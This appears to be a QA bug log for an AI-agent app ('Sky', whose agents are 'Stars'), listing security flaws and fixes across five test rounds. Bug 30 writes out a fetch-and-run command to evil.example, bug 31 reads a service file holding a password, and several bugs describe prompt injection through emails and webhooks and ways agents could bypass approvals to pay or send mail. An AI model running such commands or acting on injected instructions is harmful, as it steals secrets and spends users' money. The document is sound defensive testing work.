# Sky bugs found in testing

Each bug has a test named "BUG n" that fails until it's fixed. The testing
thread reports these, and the UI and back-end threads own the fixes.

## Round 5 (2026-10-02): wave 4 and a security sweep over every wave

I tested the back-end branch (`f14b773`) merged with the UI branch (`350cb2d`).
The back end's own tests pass, 102 of 104. The two that fail need bubblewrap,
which this machine doesn't have. All nine bugs from round 4 are fixed, and
their tests pass. All 41 browser tests pass, including three updated for
intended changes: take over follows the server, "Use this" confirms first, and
tools read "3 tools, 3 to choose". Speech providers and shops were stand-ins,
and the companion was the real program with its own settings file.

These work:
- Voice: with nothing set up, the app uses the browser's own speech (503
  `voice_unavailable`). Server speech falls back to the next provider, and a
  failing provider's key never shows.
- The companion:
  - pairing needs a fresh 8-character code that works once and runs out in 10
    minutes, and five wrong codes use it up;
  - a socket that hasn't paired gets nothing;
  - both switches stop everything;
  - every action asks, even for an autonomous Star with an "allow" rule;
  - `..` and links can't leave the allowed folders.
- Checkout: card numbers are refused in any field, even split with dashes.
  The handover always asks, even with a "fine without asking" rule, and paying
  then handing back finishes the task.
- In the browser: the pairing panel shows the code and how long it lasts.

### 28. Key presses never ask, so a Star can type a card number and press Pay (high, server)

`browser_press` counts every key except plain `Enter` as a read
(`effectFor` in `server/src/agent/tools/browser.ts`). Reads run without
asking, even under "always ask", and in chat. `press()` has none of the card
checks that `browser_type` has. So under "always ask", with no approval at all,
a Star can do these:
- press Tab to reach the card field;
- type the card number one digit at a time;
- press Tab to reach "Pay now", then Space, and the order is sent.

`NumpadEnter` and `Control+Enter` submit forms too, and they count as reads.
A page with hidden instructions could lead a Star through this.

Fix idea: make `browser_press` a write, and make keys that can submit or
activate (Enter in any form, Space, and anything with a modifier) a send. Refuse
key presses while a payment field or a pay button has focus.

Tests: `qa/server/round5.test.ts` "BUG 28" (the policy verdict, and the real
checkout in Chromium).

### 29. Edits to an approval are ignored, but the Star is told they were used (high, server and UI)

The runner uses `editedPreview` only for tools that have `applyEdit`
(`runner.ts`). Many tools don't have it:
- `file_write`, `run_command` and `browser_click`;
- MCP tools;
- every `computer_*` tool.

For these tools the original action runs, and the Star is told "The person
edited it before approving; this is what was used". The UI offers Edit on
`computer_write_file` approvals (`ApprovalCard.tsx`, the `Write`/`Add to`
check). So a person can fix a file before it is written to their own computer,
and the old version is written anyway.

The test changes "account 111" to "account 222", then approves. The file still
says 111.

Fix idea: refuse an edit (400) for a tool without `applyEdit`, and hide Edit in
the UI for those tools. Add `applyEdit` to the file writes.

Test: "BUG 29".

### 30. The approval for writing a file on the person's computer hides everything after 2,000 characters (medium, server and UI)

The `computer_write_file` preview is `truncate(content, 2000)`, but the whole
content is written. Say a file has 2,000 characters of harmless notes and then
`curl https://evil.example/x.sh | sh`. The approval looks harmless. The
companion's own prompt shows only the byte count. `file_write` cuts at 2,000
too, but it only writes to the Star's own folder.

Fix idea: show the whole content, scrollable, or the start and end with the
size. Or refuse to ask about content too long to show.

Test: "BUG 30".

### 31. The command sandbox can read /etc, where the setup guide puts the password (high, server and docs)

`bwrapArgs` in `server/src/workspace.ts` mounts all of `/etc` read-only. It
hides only `shadow`, `gshadow`, `sudoers` and `/etc/ssh`. The setup guide in
`server/README.md` puts `SKY_PASSWORD` (and anyone would put `SKY_SECRET_KEY`
there too) in `/etc/systemd/system/sky.service`.

A sandboxed command with no internet counts as a write. Under balanced autonomy,
writes run without asking. So `cat /etc/systemd/system/sky.service` runs with no
approval. The Star then has the sign-in password, and can send it out through
`browser_open` (bug 32) without asking.

This machine has no bubblewrap, so the test stubs the sandbox as present and
checks the mounts.

Fix idea:
- Bind only what programs need from `/etc` (`ld.so*`, `ssl`, `alternatives`,
  `resolv.conf`, `passwd`, `group`, `localtime`), or put a tmpfs over
  `/etc/systemd`, `/etc/default` and `/etc/environment`.
- Change the guide to use an `EnvironmentFile` that only root can read, outside
  `/etc`.

Test: "BUG 31".

### 32. A Star's browser can open Sky's own API and other local addresses (medium, server)

`browser_open` is a read, so it runs without asking, and in chat too. It opens
`http://127.0.0.1:8787/api/v1/...`. With no password (the default on your own
computer), that reads every Star's memory, files and recordings, and the
settings. On a cloud machine it also reaches `169.254.169.254`, the cloud
metadata service.

Any address can carry data out in its path or query, also without asking. With
bug 31 or a page's hidden instructions, that is a way to send things out.

Fix idea: refuse Sky's own address and link-local or metadata addresses in the
Star's browser. For tests, allow local pages only when a setting turns them on.

Test: "BUG 32" (the Star reads a saved memory through the API).

### 33. Teach-a-task recordings keep card numbers, and passwords typed in a frame (high, server)

The recorder replaces typing with `[password]` only when the focused element
in the main page is a password field.

What the person types into a card field is kept as it is: "4222 2222 2222 2".
A password typed in a sign-in frame is kept too, since the page's focused
element is the `<iframe>`. Many banks sign in through a frame. Shadow DOM and a
"show password" field (type text) have the same problem.

Recordings are stored, shown in the app, and sent to the model to draft the
skill. Teach doesn't call `vault.redact` either.

Fix idea: in the frame where the typing happens, look through frames and
shadow roots to the real focused element. Also treat `cc-*` autocomplete,
fields `looksLikeCard` matches, and `one-time-code` as secret. Redact the
vault's values before saving.

Test: "BUG 33".

### 34. An allowed program can reach files outside the allowed folders (medium, companion and docs)

The companion checks the folder a program runs in, but not its arguments. With
`cat` allowed, `computer_run cat /path/outside/private.txt` printed the file.
`computer_read_file` refused the same file. `git -C ~`, `python3 -c ...` and
`node -e ...` reach anything too. The companion README's own examples allow
`git` and `python3`, and it only warns about shells.

Every run still asks in Sky, and on the computer unless confirm is off. So this
is about what the allowlist promises.

Fix idea:
- Refuse arguments that are absolute paths, start with `~`, or contain `..`,
  unless they resolve inside an allowed folder.
- In the README and in `allow-command`, warn that interpreters and `git` can
  reach anything.

Test: "BUG 34".

### Lower-risk notes (no test)

- Anyone who can reach the server can open the companion socket without
  signing in and send five wrong codes. That uses up the person's live pairing
  code, so they have to make a new one. Fix idea: ask for sign-in (or the
  token) on the upgrade, or limit misses by address.
- `Companion.result()` doesn't check that a reply comes from the computer that
  got the call. Call ids are random, so this is hardening only.
- When no computer is named, the one that runs is picked again at run time,
  not the one shown on the approval. Fix idea: save the device id in the
  approval.
- Voice uploads of up to 25 MB are held in memory, with no limit on how many
  run at once.
- `pageUrl` and the live view allow `localhost` and private addresses for the
  person. That's fine for the person, and it's part of why bug 32 works for
  Stars.

## Round 4 (2026-10-02): wave 2, all fixed

Bugs 19 to 27 are now fixed, and their tests pass.

I tested the back-end branch (`533666a`) merged with the UI branch (`59910ce`).
The back end's own 87 tests pass, and the web app builds and type-checks. All
seven bugs from round 3 are fixed, and their tests now pass. Telegram, Slack
and Gmail were stand-ins (Slack through a real WebSocket server), and MCP
servers ran on this machine.

These work: webhooks without sign-in while the rest of the API still needs the
password; wrong tokens, paused tasks and retired URLs all get 404; GitHub
signatures are checked over the exact body; 30 events an hour, then 429, with
at most 20 waiting. Strangers on Telegram and Slack are ignored, and only the
paired person can press Approve or Decline. Channel and group messages only
fire triggers. Each Star's address, the 10-an-hour cap and rename-safe aliases
work. MCP secret values reach the server and never come back through the API,
per-Star access holds, and removing a server takes it off every Star. Group
chats answer once per Star, at most two per message, with no duplicates when
two messages arrive close together. Templates leave out memory, chats and
secrets, and refuse bad files. In the browser: a webhook goal, Telegram
pairing, a Star's address, adding an MCP server with a vault secret, a group
chat with tap-to-mention, and using a built-in template all work.

### 19. Mail from someone else can count as the person's own request (high, server)

`StarMail.handle` in `server/src/mail.ts` decides who sent a mail with
`from.toLowerCase().includes(me)`. So these all count as the person, and the
Star is told "do what it asks": `mallory <ad@gmail.com>` (any address ending
in the person's), `d@gmail.com <mallory@evil.example>` (the person's address as
a display name), and `mallory <d@gmail.com.evil.example>`. Anyone who knows a
Star's address can give it orders. Fix idea: parse the address out of the
angle brackets and compare it exactly. Better still, also check Gmail's
`Authentication-Results` (SPF or DKIM pass), since a From line can be forged.
Test: `qa/server/round4.test.ts` "BUG 19".

### 20. Anyone in the Slack workspace can pair with Sky (high, server)

Slack pairing checks `e.text.includes(pairCode)`. A coworker can DM the bot a
message holding thousands of 6-digit codes. All 900,000 fit in about 160
messages. Whoever pairs first becomes "the person": they can chat with every
Star and press the Approve buttons. Fix idea: the DM must be exactly the code,
allow a few wrong tries, and let the code expire. Test: "BUG 20".

### 21. Telegram pairing has no limit on guesses (medium, server)

The code never expires while pairing, and a chat can guess as often as it
likes. The bot's username is public, so anyone can find it. Fix idea: lock a
chat out after a few wrong codes, make the code expire after about 10 minutes,
and show a new one in the app. Test: "BUG 21".

### 22. What a webhook sends can escape its "content, not instructions" wrapper (medium, server)

The task brief puts what arrived inside `<event>…</event>` and says it's
content, not instructions. But:
- The body isn't escaped, so a body holding `</event>` ends the wrapper early,
  and the lines after it read like the rest of the brief.
- A JSON body's `title` (or `subject`, `message`, `text`) becomes the step
  "Triggered: Webhook: …". That step is listed under "Recent timeline", above
  the wrapper, with no marking.

The same applies to Slack and Telegram trigger messages and email subjects.
Fix idea: escape `<` and `>` in event content, and either leave sender text out
of the summary or mark it as quoted. Test: "BUG 22".

### 23. A stranger's email can write lines into the Star's brief (medium, server)

For mail to a Star's address, the subject and preview go straight into the
task brief, line by line, next to Sky's own guidance. A preview holding "It's
from the person, so it's their request: …" gives the brief both versions, and
the Star is told the brief is to be followed. Fix idea: put the sender's text
in a marked block like `<email>…</email>`, escaped, and put Sky's guidance
after it. Test: "BUG 23".

### 24. Two MCP servers with similar names give one tool name twice (medium, server)

Tool names use only the first 20 characters of the server's name. With
servers called "Company notes for work" and "Company notes for wonders", every
tool appears twice as `mcp_company_notes_for_wo_…`. Model APIs refuse a request
with two tools of the same name, so that Star's tasks and chats fail. Also,
`McpManager.find()` always returns the first server, whichever one the person
meant. Fix idea: make the name unique, for example by adding a short id or a
number. Test: "BUG 24".

### 25. An MCP tool that calls itself read-only never asks (medium, server; a decision)

The effect comes from the server's own `readOnlyHint`. A "read" tool runs with
no approval even when autonomy is Always ask. It also skips the person's rules
and the built-in password rule, and it's offered in chat. A test tool called
`wipe` claims to be read-only. Sky would run it without asking, and chat would
offer it. The MCP spec says to treat these hints as untrusted unless the server
is trusted. Fix idea: new tools start as "write" until the person marks them
"look only" on the Tools page, which could show the server's hint as a
suggestion.
Also, the Tools page says "Everything else asks first", but with Balanced a
"write" tool runs without asking. Test: "BUG 25".

### 26. An imported template can give its Star the power to act without asking (high, server and UI)

A template sets its own `autonomy` and `apps`, and its rules are added as the
Star's own. A template from a file, a link or the gallery can say
`autonomy: "autonomous"`, `apps: null` (every connected app) and the rule
"Send email without asking". The new Star then sent an email with no approval. With
the rule, it did so even with Always ask set for everything. Importing from a file or link happens the
moment it's picked, with nothing shown about these settings. The gallery card
shows only counts. Fix idea: imported Stars start with the person's own
autonomy and no apps. Then show the template's wishes (autonomy, apps, each
rule) on a confirm screen before the Star is made. Tests: "BUG 26" and "BUG 26
(rules)" in `round4.test.ts`, and "BUG 26 (UI)" in `ui.test.mjs`.

### 27. A remote MCP server's error can show a secret in plain text (medium, server and UI)

When a hosted MCP server fails, its error message is stored as is. A server
that repeats the request's header in its error, like `Invalid key: Bearer
…`, puts the vault secret in `GET /mcp`, in `mcp.updated` events and on the
Tools page. This is the same problem as round 3's bug 14, but for MCP. Fix
idea: run `vault.redact()`, and remove the server's filled header and env
values, on `McpServer.error`. Test: "BUG 27".

Also seen, small enough to leave without tests:
- Changing `mailPollMinutes` only takes effect after a restart: `Triggers.start()`
  reads it once. I found this by reading the code.

## Round 3 (2026-10-02): models, the live browser and wave 1, all fixed

Bugs 12 to 18 are now fixed, and their tests pass.

I tested the back-end branch (`aae76f7`) merged with the UI branch (`502d3a7`).
The back end's own 66 tests pass, and the web app builds and type-checks. All
three bugs from round 2 are fixed, and their tests now pass. Stand-in model
providers and web pages ran on this machine, since outside sites are blocked.

These work: adding providers on the Models screen, the Test button, chat falling
back past a broken provider, a provider that never answers or stops halfway
through a reply, and a provider that's rate limited still being tried when it's
the only one. Taking over the live browser pauses the Star, and handing back
wakes it. A correction in chat shows a lesson card, and Undo forgets it. The
secrets screen never shows a value, and the API never returns one. An ntfy
topic can be made and saved. All the wave 1 input checks I tried give 400s.

**The two bugs the design thread reported:** the bad address bug is real (bug
13). The lesson card is not a server bug. A correction makes a lesson and a card
every time, and in the browser the card shows up with a working Undo. One thing
that may explain what they saw: a correction is only learned when Sky has said
something before it, so a correction sent as the first message in a chat makes
no card. That's on purpose (`chat.ts` needs an earlier reply).

### 12. A model that never answers can freeze all of Sky's work (high, server)

The timeout only covers chat turns. `complete()` in `server/src/agent/openai.ts`
never passes an abort signal, and the router's timeout only gives up when the
call does. Rule checks, lessons, ideas and the briefing all use `complete()`.
With a provider that accepts the request but never replies, a task with a custom
rule stayed at "Working on Email Sam" with no approval, and the shared work
queue stopped. Fix idea: pass the router's signal to `complete()` the same way
`turn()` does. Test: `qa/server/round3.test.ts` "BUG 12".

### 13. A bad address in the live browser gives a server error (medium, server)

`POST /browser/:starId/input` with `navigate` returns 500 "Something went wrong
on the server" for any address that can't load: `data:`, `javascript:`, plain
text, or a closed port. `data:` text becomes `https://data:text/html,...`. Fix
idea: catch the `page.goto` error and return a 400 that says the page couldn't
load. Tests: "BUG 13" in `round3.test.ts` and `ui.test.mjs`.

### 14. A provider's API key leaks when the provider repeats it in an error (high, server)

Some providers echo the key back, for example `401 Invalid API key: sk-...`.
Sky passes the message on as is, so the full key shows up in the chat error, in
`GET /providers` (`health.lastError`), in the Test result, in `provider.updated`
events, in the server log, and on the Models screen. Fix idea: replace the
provider's key with `…last4` in every error message before it's stored or sent.
Also small: `keyHint` is the whole key when the key is 4 characters or shorter.
Tests: "BUG 14" in `round3.test.ts` and `ui.test.mjs`.

### 15. A secret used in a browsed address shows in plain text (high, server and UI)

When a Star opens `{{secret:API_TOKEN}}` in an address (after approval), the real
value shows in `GET /browser` (`sessions[].url`), in `browser.frame` events, and
in the live view's address bar. Task steps, activity, approvals, server logs and
what's sent to the model all stay clean. Fix idea: run `vault.redact()` on the
session's `url` and `title` in `BrowserManager.session()`. Test: "BUG 15".

### 16. Any web page can change Sky through the local API (high, server)

With no password, which is the default, a page on any site can send requests to
Sky's API. The server reads JSON whatever the content type says, and it never
checks where a request came from. So a `text/plain` request in `no-cors` mode
needs no permission from the browser. A test page on another port added the rule
"Send emails without asking", added a provider pointing at another server, added
a push subscription and paused Sky. Fix idea: require `Content-Type:
application/json` on writes, and refuse requests whose `Origin` or
`Sec-Fetch-Site` shows another site. Test: "BUG 16".

### 17. "Tool calling is not supported with this model" benches the provider for 6 hours (medium, server)

`classify()` in `server/src/models/registry.ts` treats any 400 that mentions the
model and says "not supported" or "invalid" as a broken provider. So "tool
calling is not supported with this model" or "Invalid value for max_tokens: too
large for this model" turns the provider off for 6 hours. The docs say a request
that doesn't suit a model should move on without benching it. Other wordings,
like "does not support tools", already move on correctly. Fix idea: only bench
on "model not found" style messages (unknown or retired model names). Test:
"BUG 17".

### 18. A secret shorter than 4 characters is never hidden (low, server)

The vault accepts a 3-character value such as a PIN, but `redact()` skips values
shorter than 4 characters, so it would show wherever redaction is relied on. Fix
idea: refuse values under 4 characters, or redact them too. Test: "BUG 18".

Also seen, small enough to leave without tests:
- A push subscription whose endpoint is Sky's own API (`http://127.0.0.1:8787/...`)
  is accepted.

## Round 2 (2026-10-02): Stars, all fixed

Bugs 9, 10 and 11 are now fixed, and their tests pass.

I tested the back-end branch (PR #1, `e577244`) merged with the UI branch
(`9f14cc1`) in Chromium and through the API. The server's 43 tests pass, and the
web app builds. All eight bugs from round 1 are fixed, and their tests now pass.

These work end to end: making a Star (including the error for a name that's
taken), chatting with a Star, handing work over from the main chat, one Star
asking another and carrying on with the answer, pausing one Star while the others
keep working, pausing and waking every Star, an approval landing in the chat of
the Star that asked for it, and removing a Star.

### 9. Text typed while an empty chat loads is wiped (medium, UI)

This explains the chat test timeouts the design thread couldn't reproduce.

While a chat's messages are loading, `Chat.tsx` shows the normal composer. If the
chat turns out to be empty, the page switches to the welcome view, which has its
own composer. That swap throws away anything typed in the first composer. Pressing
Enter then sends nothing, because the new box is empty. A test, or a quick user on
a fresh chat or a slow connection, types before the swap and loses the message.

The timeouts only show up when the main chat is empty, such as a fresh server
with no briefing posted yet, and when typing beats the messages response. That's
why the failures came and went. The test makes it repeatable: it slows the
messages response in an empty Star chat and types during the delay.

Fix idea: render the same `Composer` instance in both views, or lift its text
into `Chat`. Test: `qa/e2e/ui.test.mjs` "BUG 9". The other chat tests now wait for
the chat to load, so they test chat itself and not this race.

### 10. A removed Star's chat link loads forever (low, UI)

Opening `#/chat/<id>` for a removed Star's chat leaves the page on loading
placeholders. `Chat.tsx` calls `api.listMessages(activeId).then(setMessages)`
with no `catch`, so the 404 is dropped. The Star editor already handles this case
("That Star is gone"), and the chat could do the same. Test: "BUG 10".

### 11. Stopping a task doesn't stop the work it asked another Star for (low, server)

When a task is waiting on another Star (`ask_star`) and you stop it, the other
Star's task carries on and does the work for nobody. The same happens when the
asking Star is removed: the helper finishes and replies to a Star that no longer
exists. The reverse case works: if you stop the helper's task, the asking task
hears about it and ends. Fix idea: when a task ends, cancel the open `ask_star`
tasks it started. Test: `qa/server/contract.test.ts` "BUG 11".

Also seen, small enough to leave without tests:
- Constellation notes that involve a removed Star disappear from the feed
  (`StarNote` returns null when either Star is missing).
- Rules typed while making a new Star are dropped silently if saving one fails
  (`StarEditor.save` swallows the error).

## Round 1 (2026-10-02): all fixed

1. The app opened one event stream per hook, and 6 streams froze every request. Fixed.
2. Server errors were swallowed in chat, task commands and approvals. Fixed.
3. There was no way to sign in when a password was set. Fixed.
4. A reply cut off by a restart stayed "streaming" forever. Fixed.
5. Run now brought back a task you had stopped. Fixed.
6. A malformed URL returned a 500. Fixed.
7. A garbled activity cursor returned an empty page. Fixed.
8. PATCH /settings accepted a body that wasn't an object. Fixed.

## Not tested

- Real model providers and real websites. Outside sites are blocked here, so
  providers and pages were stand-ins on this machine.
- Push delivery to a real phone, through Web Push or ntfy.
- Live Telegram, Slack and Gmail. Stand-ins covered pairing, buttons, triggers
  and polling. Gmail's real `From` handling and its spam checks weren't tested.
- A template link or gallery that redirects to a local address. The server
  only starts from https links, but redirects weren't tested.
- Real Claude. There's no API key here, so everything ran on the scripted brain.
  In particular, how well a real model picks `ask_star`, `hand_off` and
  `message_star` isn't tested.
- Real OAuth apps. Gmail was faked in-process.
- bubblewrap itself. This machine doesn't have it, so commands ran without
  the sandbox and asked every time. Bug 31 was found by reading the mounts.
- The companion on Windows and macOS, opening pages on a real desktop, and
  speech on a real phone microphone. Real Groq Whisper wasn't tested either.
- A real card payment. The handover was tested up to the person paying on a
  local page.
- Approval expiry after 24 hours, and ask chains 3 deep through the UI. The
  server's own tests cover the depth limit.
